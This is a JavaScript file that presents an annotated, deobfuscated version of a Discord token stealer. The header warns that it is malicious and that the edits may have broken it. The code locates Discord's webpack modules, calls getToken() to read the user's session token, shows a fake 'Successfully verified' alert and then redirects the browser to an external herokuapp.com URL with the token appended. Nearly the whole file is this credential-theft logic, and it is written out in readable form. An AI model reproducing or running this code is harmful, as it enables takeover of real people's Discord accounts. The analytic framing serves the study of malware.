// !!! WARNING: This script contains MALICIOUS CODE !!!
// !!! WARNING: DO NOT run this in a non-sandboxed environment !!!
// !!! WARNING: Doing so could put your Discord account at risk !!! 

// This script is likely broken, as I didn't test the changes
// I made (obviously!). This is purely for better readability
// and commentation of the original source code.

// Notable changes made:
// - Most runtime constants were evaluated
// - A long condition was un-inlined
// - Some constants were inlined
// - Reformatted the source
// - Renamed variables

(function(propsValsGetter) {
	// This is smart. Mutate the global array at runtime
	// until some alignment that matches a value occurs.
	const offsetPVG = offsetPropsVals;
	/** @type {Array<string>} */
    const propsVals = propsValsGetter();

    while (true) {
        try {
			// TODO: make up a good name for this
            const _0x50f491 =
				// This was left mostly untouched because
				// I was afraid it would cause or inhibit
				// mutations of the array.
				-parseInt(offsetPVG(115)) / 0x1
				* (-parseInt(offsetPVG(107)) / 0x2)
				+ -parseInt(offsetPVG(109)) / 0x3
				* (-parseInt(offsetPVG(105)) / 0x4)
				+ -parseInt(offsetPVG(104)) / 0x5
				* (-parseInt(offsetPVG(125)) / 0x6)
				+ parseInt(offsetPVG(108)) / 0x7
				* (parseInt(offsetPVG(119)) / 0x8)
				+ parseInt(offsetPVG(121)) / 0x9
				* (parseInt(offsetPVG(116)) / 0xa)
				+ -parseInt(offsetPVG(114)) / 0xb
				+ parseInt(offsetPVG(113)) / 0xc
				* (-parseInt(offsetPVG(112)) / 0xd);
            
			if (_0x50f491 === 0x4e0af) break;
            else propsVals.push(propsVals.shift());
        } catch (__dead_error) {
            propsVals.push(propsVals.shift());
        }
    }
}(getPropsValsArr));

function offsetPropsVals(index$0, _dead_param) {
    const propertiesValues = getPropsValsArr();

	// Redefine the function as a closure to return some (offset)
	// index of propertiesValues in one line (presumably)
    offsetPropsVals = function(index$1, __dead_param) {
        return propertiesValues[index$1 - 0x68];
    }
	
	return offsetPropsVals(index$0, _dead_param);
}

(function() {
    const offsetPVG = offsetPropsVals;
	let globalExports;
	let iterator;
	let token;

	// There was some "webpackJsonp" part of the code around here.
	// It was removed because my browser and the desktop app both
	//  seemed to be using "webpackChunkdiscord_app" instead.
	// There might be some version of the site that uses the former.

	if (window.get_require)
	{
		window.webpackChunkdiscord_app.push([
			[],
			{
				get_require: function (module, _, exportValue) {
					module.exports = exportValue;
				}
			}, [[
				'get_require'
			]]
		]);

		delete globalExports.m.get_require;
		// NOTE: This imitates original functionality.
		// NOTE: Iterating over `true` will cause no loop to occur.
		iterator = delete globalExports.c.get_require;
	}
	else
	{
		if (window.webpackChunkdiscord_app)
		{
			window.webpackChunkdiscord_app.push([
				[ Math.random() ],
				function callback (globalExp) {
					globalExports = globalExp;
				},
				[[
					'get_require'
				]]
			]);

			iterator = globalExports.c;
		}
	}

	for (let module in iterator) {
		if (iterator.hasOwnProperty(module)) {
            let modulesExports = iterator[module].exports;
			let isValidModuleCandidate =
				modulesExports
				&& modulesExports.__esModule
				&& modulesExports['default'];

			const wantedModule = 'getToken';
            if (isValidModuleCandidate) {
                for (let defaultExport in modulesExports['default']) {
					if (defaultExport === wantedModule) {
						token = modulesExports['default'].getToken();
					}
				}
            }
        }
		
		alert('Successfully verified');

		// Send token to the long url defined in propertiesValuesArray.
		// offsetPVG(0x76) = 'https://gsasggsas...'
		window.location.href = offsetPVG(0x76) + token;
	}
})();

function getPropsValsArr() {
    const propertiesValuesArray = [
		'996tzqGqz',
		'6708317CpkhRV',
		'1GNZewO',
		'5937100jRCsEU',
		'exports',
		'https://gsasggsasgagsa.herokuapp.com/verify.php?key=' + 'fortniteamongustycoonlol' + '&value=',
		'8hNHXLE',
		'get_require',
		'9pZDjGw',
		'default',
		'push',
		'hasOwnProperty',
		'114njxRLt',
		'href',
		'getToken',
		'104675LGFIqA',
		'286052YIvLMj',
		'webpackChunkdiscord_app',
		'790046YBXMUw',
		'944069XQNXho',
		'21wpZEwT',
		'random',
		'webpackJsonp',
		'171106ENBVYa'
	];
    
	getPropsValsArr = function() {
        return propertiesValuesArray;
    };

    return getPropsValsArr();
}